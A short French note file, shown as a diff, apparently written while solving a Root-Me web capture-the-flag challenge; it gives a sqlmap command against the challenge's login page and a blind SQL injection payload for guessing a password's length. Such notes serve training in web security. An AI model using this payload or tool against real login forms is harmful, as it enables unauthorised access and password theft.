@@ -1,0 +1,7 @@
+Trouver des infos sur le sgbd avec SQLMAP:
+
+sqlmap -u "http://challenge01.root-me.org/web-serveur/ch10/index.php" --data "username=monloginadmin&password=monmotdepasse"
+
+Trouver la longueur d'un mot de passe en blind:
+
+admin' and (1=0 or length(password)>i)/* -> faire varier i 
